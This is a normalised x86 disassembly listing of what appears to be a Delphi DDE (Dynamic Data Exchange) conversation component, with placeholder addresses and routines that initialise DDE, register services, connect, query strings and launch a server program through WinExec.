push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463cf1
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_403fe0
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeGetLastError
mov ebx eax
mov eax ebx
add eax 0xffffbff9
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405aec
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408b94
jmp r-xdata
dec eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405aec
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408b94
jmp r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405aec
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x10 ]
xor ecx ecx
call sub_408b94
sub_463cf8
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov ebx [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
xor edi edi
mov eax esi
sub eax 0x1062
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_4640a0
mov edi eax
and edi 0x7f
jmp r-xdata
sub eax 0x1080
je r-xdata
test ebx ebx
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x18 ]
mov eax [ rw-data ]
call sub_464154
mov edi eax
jmp r-xdata
sub eax 0x5f90
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov [ ebp - 0x64 ] 0x60
cmp esi 0x8080
jne r-xdata
mov eax [ ebp + 0x24 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax [ rw-data ]
call sub_4641b8
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp esi 0x4050
jg r-xdata
lea eax [ ebp - 0x64 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push ebx
call DdeQueryConvInfo
test eax eax
je r-xdata
sub esi 0x4090
je r-xdata
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_465b60
mov edi eax
jmp r-xdata
sub esi 0x3fb0
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x1c ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_465c14
mov edi eax
jmp r-xdata
sub esi 0x1030
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_465b30
jmp r-xdata
sub esi 0x40
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_4659fc
mov edi eax
and edi 0x7f
jmp r-xdata
sub esi 0xff2
je r-xdata
mov eax [ ebp - 0x60 ]
test eax eax
je r-xdata
sub esi 0x42
je r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_465c34
mov edi eax
jmp r-xdata
sub esi 0x8e
je r-xdata
call sub_464da0
jmp r-xdata
mov ebx [ ebp - 0x60 ]
test ebx ebx
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x60 ]
mov eax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x14 ]
mov edx ebx
mov eax esi
call sub_465c34
mov edi eax
jmp r-xdata
sub esi 0x1f60
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033f8
test al al
je r-xdata
mov eax [ ebp - 0x60 ]
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x1c ]
call sub_464dec
jmp r-xdata
jmp r-xdata
mov edx ebx
mov eax [ rw-data ]
call sub_46429c
mov eax ebx
call sub_464da8
jmp r-xdata
sub_463f08
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_463fbc
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_419380
push r-xdata
call RegisterClipboardFormatA
mov [ esi + 0x48 ] ax
xor eax eax
mov [ esi + 0x44 ] eax
push 0x0
push 0x0
push sub_463cf8
lea eax [ esi + 0x44 ]
push eax
call DdeInitializeA
test eax eax
sete al
call sub_463bf8
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x38 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x40 ] eax
lea edx [ ebp - 0x4 ]
xor eax eax
call sub_4029e4
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4642e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463fc3
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
add esp 0xfffffff0
call sub_403590
sub_463fe5
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
push ebp
call sub_4035f8
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x3c ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x40 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x38 ]
call sub_40326c
xor eax eax
mov [ ebp + 0x38 ] eax
inc esi
xor edi edi
mov eax ebp
call sub_464398
mov eax [ ebp + 0x44 ]
push eax
call DdeUninitialize
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_4193cc
test bl bl
jle r-xdata
call sub_40326c
xor eax eax
mov [ ebp + 0x40 ] eax
mov eax [ ebp + 0x3c ]
call sub_40326c
xor eax eax
mov [ ebp + 0x3c ] eax
inc esi
xor edi edi
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4139c8
call sub_40326c
inc edi
dec esi
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4035e0
mov eax [ ebp + 0x3c ]
mov edx edi
call sub_4139c8
call sub_40326c
inc edi
dec esi
jne r-xdata
sub_4640a0
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_464144
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ edi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_4040ac
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_4643c4
test eax eax
je r-xdata
mov eax [ edi + 0x34 ]
push eax
push esi
call DdeCmpStringHandles
test eax eax
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_464414
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46414b
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov bl 0x1
sub_464154
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov esi ecx
mov ebp edx
mov ebx eax
xor edi edi
test esi esi
je r-xdata
mov eax edi
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx esi
mov edx ebp
mov eax ebx
call sub_4640a0
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x34 ]
mov [ esp ] eax
mov [ esp + 0x4 ] esi
xor eax eax
mov [ esp + 0x8 ] eax
xor eax eax
mov [ esp + 0xc ] eax
push 0x0
push 0x1
push 0x0
push 0x0
push 0x10
lea eax [ esp + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateDataHandle
mov edi eax
sub_4641b8
push ebp
mov ebp esp
add esp 0xfffff004
push eax
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_464289
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_465934
mov ebx eax
push 0x3ec
push 0x1000
lea eax [ ebp - 0x1008 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ esi + 0x44 ]
push eax
call DdeQueryStringA
mov ecx eax
lea edx [ ebp - 0x1008 ]
lea eax [ ebp - 0x8 ]
call sub_4040ac
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0x8 ]
call sub_404010
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4643c4
mov [ ebx + 0x3c ] eax
cmp [ ebx + 0x3c ] 0x0
jne r-xdata
mov [ ebx + 0x40 ] edi
push ebx
push 0xffffffff
push edi
call DdeSetUserHandle
mov edx ebx
mov eax [ esi + 0x38 ]
call sub_41386c
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_464414
mov [ ebx + 0x38 ] eax
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464290
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov si 0xffef
call sub_403468
sub_46429c
push ebx
push esi
push edi
mov edi eax
mov ebx edx
mov eax [ ebx + 0x3c ]
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov si 0xffee
call sub_403468
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ edi + 0x38 ]
test eax eax
je r-xdata
push 0x0
push 0xffffffff
push eax
call DdeSetUserHandle
pop edi
pop esi
pop ebx
retn
mov edx ebx
call sub_413b0c
mov eax ebx
call sub_40326c
sub_4642e4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_464380
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_464398
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_40839c
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x30 ]
call sub_404010
mov edx [ ebx + 0x30 ]
mov eax r-xdata
call sub_4045c0
mov esi eax
test esi esi
je r-xdata
push 0x3ec
mov eax [ ebx + 0x30 ]
call sub_40447c
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeCreateStringHandleA
mov esi eax
mov [ ebx + 0x34 ] esi
push 0x1
push 0x0
push esi
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464387
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax [ ebx + 0x30 ]
call sub_40427c
mov ecx eax
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40451c
sub_464398
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x34 ] eax
pop ebx
retn
push 0x2
push 0x0
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeNameService
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x44 ]
push eax
call DdeFreeStringHandle
sub_4643c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x40 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x40 ]
mov edx edi
call sub_4139c8
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x8 ]
call sub_407d2c
test eax eax
jne r-xdata
sub_464414
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
xor eax eax
push ebp
push sub_464496
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45c498
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46449d
lea eax [ ebp - 0xc ]
call sub_403fbc
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx edi
call sub_45c484
mov ebx eax
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_43dec4
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_407d2c
test eax eax
jne r-xdata
sub_4644a8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov ebp eax
xor eax eax
mov [ esp + 0x4 ] eax
mov eax [ ebp + 0x38 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov eax [ ebp + 0x38 ]
mov edx edi
call sub_4139c8
mov ebx eax
mov edx [ esp ]
mov eax [ ebx + 0x30 ]
call sub_407d2c
test eax eax
jne r-xdata
sub_4644f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40446c
xor eax eax
push ebp
push sub_46454f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4644a8
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464556
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov edx [ ebp - 0x4 ]
call sub_465e1c
test eax eax
je r-xdata
call sub_466000
sub_46457c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419380
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ esi + 0x9c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax esi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4645c4
push ebx
push esi
call sub_4035f8
mov ebx edx
mov esi eax
mov eax esi
call sub_464c08
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4193cc
mov eax [ esi + 0x9c ]
call sub_40326c
xor eax eax
mov [ esi + 0x9c ] eax
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035e0
sub_464604
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4196f8
push ebx
push sub_4646d4
push ebx
push r-xdata
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov cl 0x1
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop esi
pop ebx
retn
sub_464651
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4646c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4197d0
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x30 ]
call sub_404054
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x34 ]
call sub_404054
mov eax [ ebp - 0x4 ]
call sub_40427c
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4646cf
cmp [ ebx + 0xc5 ] 0x1
je r-xdata
push 0x0
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4649c4
sub_4646d4
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46477f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_417810
jmp r-xdata
mov eax esi
call sub_4168ac
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_4184b0
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_4045c0
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_40427c
mov ecx eax
sub ecx ebx
lea edx [ ebx + 0x1 ]
mov eax [ ebp - 0x4 ]
call sub_4044dc
mov eax [ ebp - 0x4 ]
mov al [ eax ]
sub al 0x53
je r-xdata
mov eax esi
call sub_417818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464786
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_464eac
jmp r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_464ec0
jmp r-xdata
sub_464793
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46484f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_41905c
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x30 ]
call sub_404054
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408b94
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_419104
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x34 ]
call sub_404054
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x10 ]
xor ecx ecx
mov eax r-xdata
call sub_408b94
mov edx [ ebp - 0x14 ]
mov eax ebx
call sub_419104
mov eax ebx
call sub_419064
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464856
lea eax [ ebp - 0x14 ]
call sub_403fbc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fe0
retn
sub_464884
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_465198
mov esi eax
mov eax [ ebx + 0x9c ]
mov edx [ eax + 0x8 ]
mov ecx esi
call sub_413a44
mov [ esi + 0x10 ] edi
xor edx edx
mov eax esi
call sub_465208
pop edi
pop esi
pop ebx
retn
sub_4648bc
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_46497c
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_465208
mov edx ebx
mov eax [ esi + 0x9c ]
call sub_413b0c
mov eax ebx
call sub_40326c
sub_4648f4
push ebx
push esi
push edi
push ebp
push ecx
mov ebp ecx
mov edi edx
mov esi eax
mov [ esp ] 0x1
mov edx edi
mov eax esi
call sub_46497c
mov ebx eax
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_40427c
test eax eax
jle r-xdata
test ebx ebx
je r-xdata
mov eax ebp
call sub_40427c
test eax eax
jne r-xdata
mov edx edi
mov eax esi
call sub_464884
mov edx edi
mov eax esi
call sub_46497c
mov ebx eax
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebp
mov eax ebx
call sub_465208
mov [ esp ] al
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_4648bc
jmp r-xdata
test [ esi + 0x1c ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_4648bc
sub_46497c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
xor eax eax
mov [ esp + 0x4 ] eax
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4139c8
mov edx [ eax + 0x10 ]
cmp edx [ esp ]
jne r-xdata
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
mov [ esp + 0x4 ] eax
jmp r-xdata
sub_4649c4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_464c08
mov edx ebx
mov eax esi
call sub_464eac
mov edx edi
mov eax esi
call sub_464ec0
mov eax esi
call sub_464a14
mov ebx eax
test bl bl
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
xor edx edx
mov eax esi
call sub_464eac
xor edx edx
mov eax esi
call sub_464ec0
sub_464a14
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x108 ] edx
mov edi eax
xor eax eax
push ebp
push sub_464bea
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x1 ] 0x0
cmp [ edi + 0x38 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_464bf1
lea eax [ ebp - 0x108 ]
call sub_403fbc
retn
mov eax [ edi + 0x30 ]
call sub_40427c
test eax eax
jne r-xdata
cmp [ edi + 0xa0 ] 0x0
jne r-xdata
mov eax [ edi + 0x34 ]
call sub_40427c
test eax eax
jne r-xdata
cmp [ edi + 0xa4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x30 ]
call sub_408564
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa0 ] eax
mov eax edi
call sub_464c88
jmp r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_464cc8
mov ebx eax
test bl bl
jne r-xdata
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0x34 ]
call sub_408564
push 0x3ec
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeCreateStringHandleA
mov [ edi + 0xa4 ] eax
test bl bl
jne r-xdata
mov eax [ edi + 0x30 ]
call sub_40427c
test eax eax
jne r-xdata
mov eax [ edi + 0x58 ]
test eax eax
je r-xdata
mov eax edi
call sub_464c88
jmp r-xdata
mov eax [ edi + 0xc0 ]
call sub_40427c
test eax eax
je r-xdata
mov eax [ edi + 0xc0 ]
call sub_40427c
test eax eax
je r-xdata
mov [ edi + 0xa8 ] 0x1
mov [ edi + 0xa8 ] eax
jmp r-xdata
push [ edi + 0x30 ]
push r-xdata
push [ edi + 0x34 ]
lea eax [ ebp - 0x108 ]
mov edx 0x3
call sub_40433c
mov edx [ ebp - 0x108 ]
lea eax [ ebp - 0x101 ]
call sub_408564
lea eax [ ebp - 0x101 ]
mov edx [ edi + 0xc0 ]
call sub_408564
jmp r-xdata
mov eax edi
mov si 0xffee
call sub_403468
xor ecx ecx
xor edx edx
mov eax edi
call sub_464dec
mov [ ebp - 0x1 ] 0x1
mov eax edi
call sub_464d40
test al al
je r-xdata
mov ecx [ edi + 0xa4 ]
mov edx [ edi + 0xa0 ]
mov eax edi
call sub_464cc8
mov ebx eax
push 0x7
lea eax [ ebp - 0x101 ]
push eax
call WinExec
cmp eax 0x20
jb r-xdata
sub_464c08
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
mov esi eax
mov eax ebx
call sub_464da8
xor eax eax
mov [ ebx + 0x38 ] eax
push 0x0
push 0xffffffff
push esi
call DdeSetUserHandle
push esi
call DdeDisconnect
mov eax [ ebx + 0xa4 ]
test eax eax
je r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa0 ] eax
xor edx edx
mov eax ebx
call sub_464eac
xor edx edx
mov eax ebx
call sub_464ec0
pop esi
pop ebx
retn
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeFreeStringHandle
xor eax eax
mov [ ebx + 0xa4 ] eax
sub_464c88
push ebx
push esi
mov esi eax
mov eax [ esi + 0x9c ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov bx [ eax + 0x8 ]
dec ebx
test bx bx
jb r-xdata
inc ebx
mov eax [ esi + 0x9c ]
xor edx edx
call sub_4139c8
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x10 ]
call sub_465084
dec bx
jne r-xdata
sub_464cc8
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov ebp ecx
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402c88
mov [ esp ] 0x24
mov [ esp + 0xc ] 0x3ec
push esp
push ebp
push edi
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
push eax
call DdeConnect
mov ebx eax
mov [ esi + 0x38 ] ebx
test ebx ebx
setne al
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x3c ] 0x60
lea eax [ esi + 0x3c ]
push eax
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeQueryConvInfo
push esi
push 0xffffffff
mov eax [ esi + 0x38 ]
push eax
call DdeSetUserHandle
sub_464d40
push ebx
push esi
push edi
push ebp
mov esi eax
xor eax eax
cmp [ esi + 0x38 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor ebx ebx
jmp r-xdata
movzx ebp bx
mov edi [ esi + 0x9c ]
cmp ebp [ edi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax edi
call sub_4139c8
mov edi eax
mov eax edi
call sub_465408
test al al
jne r-xdata
mov al 0x1
inc ebx
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ edi + 0x10 ]
call sub_465084
jmp r-xdata
movzx eax bx
mov edx [ esi + 0x9c ]
cmp eax [ edx + 0x8 ]
jge r-xdata
sub_464da8
push ebx
push esi
push edi
push ebp
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
xor eax eax
mov [ edi + 0x38 ] eax
xor ebx ebx
jmp r-xdata
mov eax edi
mov si 0xffef
call sub_403468
movzx ebp bx
mov esi [ edi + 0x9c ]
cmp ebp [ esi + 0x8 ]
jl r-xdata
mov edx ebp
mov eax esi
call sub_4139c8
call sub_465500
inc ebx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_464dec
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov [ esp ] edx
mov esi eax
xor ebx ebx
jmp r-xdata
movzx eax bx
mov ebp [ esi + 0x9c ]
cmp eax [ ebp + 0x8 ]
jl r-xdata
movzx edx bx
mov eax ebp
call sub_4139c8
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
call sub_4652b4
cmp edi [ eax + 0x8 ]
jne r-xdata
inc ebx
sub_464e2c
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0xc5 ]
je r-xdata
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov [ esi + 0xc5 ] bl
mov eax [ esi + 0x30 ]
call sub_40427c
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
call sub_40427c
test eax eax
je r-xdata
mov eax esi
call sub_464a14
test al al
jne r-xdata
mov ecx [ rw-data ]
